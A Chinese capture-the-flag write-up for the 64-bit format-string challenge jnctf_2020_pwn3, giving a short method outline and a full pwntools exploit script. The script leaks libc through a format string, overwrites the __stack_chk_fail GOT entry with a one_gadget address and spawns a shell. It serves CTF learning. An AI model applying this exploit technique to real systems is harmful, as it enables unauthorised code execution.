# JNCTF-2020 : jnctf_2020_pwn3

## **【原理】**
64位格式化字符串

## **【目的】**
getshell

## **【环境】**
Ubuntu 16.04

## **【工具】**
Pwntools,ida,gdb,one_gadget

## **【步骤】**

​          先通过数组溢出实现修改加密机会次数，再通过格式化字符串漏洞泄露栈上的一些敏感地址从而获取libc的基地址，再通过格式化字符串漏洞修改___stack_chk_fail got表上的内容，覆盖为onegadget的地址，最后通过一下破坏cannary的栈溢出来实现getshell。


```python

from pwn import*
context.log_level = 'debug'
p = process('./jnctf_2020_pwn3')
elf = ELF('./jnctf_2020_pwn3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget = [0x45226,0x4527a,0xf0364,0xf1207]
stack_fail_got = elf.got['__stack_chk_fail']
def game1(name,payload):
	p.sendlineafter('choice:\n','1')
	p.sendafter('name?\n',name)
	p.sendafter('message:\n',payload)
def game2(payload):
	p.sendlineafter('choice:\n','2')
	p.sendafter('message:\n',payload)
def game3(payload):
	p.sendlineafter('choice:\n','3')
	p.sendafter('message:\n',payload)
def getpayload(oneset,i):
	payload = '%'+str(oneset)+'c'+'%8$hhn'
	payload = payload.ljust(0x10,'a')
	payload += p64(stack_fail_got+i)
	return payload
def pr(str1,addr):
	log.success(str1+'=====>'+hex(addr))
game1('aaaa','a'*0x140+p64(0x100))

payload = '--%15$p'
game2(payload)
p.recvuntil('--')
__libc_start_main = int(p.recv(14),16) - 240
libcbase = __libc_start_main - libc.symbols['__libc_start_main']
one = libcbase + one_gadget[0]
pr('__stack_chk_fail',stack_fail_got)
pr('__libc_start_main',__libc_start_main)
pr('libcbase',libcbase)
pr('one',one)
oneset = []
while one!=0:
	oneset.append(one&0xff)
	one = one >> 8
for i in range(len(oneset)):
	game2(getpayload(oneset[i],i))
game3('a')
#gdb.attach(p,'b *0x4009E0')
p.interactive()



```

## **【总结】**
需要有一定的思路